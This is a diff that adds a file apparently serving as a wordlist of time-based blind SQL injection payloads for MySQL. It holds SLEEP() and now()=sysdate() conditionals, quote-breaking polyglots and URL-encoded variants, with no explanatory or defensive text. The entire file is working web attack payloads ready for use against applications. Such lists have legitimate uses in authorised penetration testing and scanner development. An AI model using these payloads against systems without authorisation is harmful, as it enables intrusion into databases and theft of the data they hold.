@@ -1,0 +1,16 @@
+0'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(20),0)
+'XOR(if(now()=sysdate(),sleep(20),0))XOR'
+'XOR(if(now()=sysdate(),sleep(20*1),0))OR'
+0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
+0'or(now()=sysdate()&&SLEEP(1))or'Zif(now()=sysdate(),sleep(20),0)/"XOR(if(now()=sysdate(),sleep(20),0))OR"/if(now()=sysdate(),sleep(20),0)/*'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0))OR"*/if(now()=sysdate(),sleep(20),0)/'XOR(if(now()=sysdate(),sleep(20),0))OR'"XOR(if(now()=sysdate(),sleep(20),0) and 5=5)"/if(1=1,sleep(20),0)/*'XOR(if(1=1,sleep(20),0))OR'"XOR(if(1=1,sleep(20),0))OR"*/if(1337=1337,exp(~(1)),0)/*'XOR(if(1337=1337,exp(~(1)),0))OR'"XOR(if(1337=1337,sleep(20),0))OR"*/SLEEP(20)/*' or SLEEP(20) or '" or SLEEP(20) or "*/%2c(select%5*%5from%5(select(sleep(20)))a)
+(select(0)from(select(sleep(20)))v)
+(SELECT SLEEP(20))
+'%2b(select*from(select(sleep(20)))a)%2b'
+(select*from(select(sleep(20)))a)
+1'%2b(select*from(select(sleep(20)))a)%2b'
+,(select * from (select(sleep(20)))a)
+desc%2c(select*from(select(sleep(20)))a)
+-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(20))A))
+-1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(20))A))(SELECT * FROM (SELECT(SLEEP(20)))YYYY)(SELECT * FROM (SELECT(SLEEP(20)))YYYY)#(SELECT * FROM (SELECT(SLEEP(20)))YYYY)--'+(select*from(select(sleep(20)))a)+'(select(0)from(select(sleep(20)))v)%2f'+(select(0)from(select(sleep(20)))v)+'"(select(0)from(select(sleep(20)))v)%2f*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*%2f(select(0)from(select(sleep(20)))v)/*'+(select(0)from(select(sleep(20)))v)+'"+(select(0)from(select(sleep(20)))v)+"*/(select(0)from(select(sleep(20)))v)/*'+(select(0)from(select(sleep(20)))v)+'\"+(select(0)from(select(sleep(20)))v)+\"*/',''),/*test*/%26%26%09sLeEp(20)%09--+
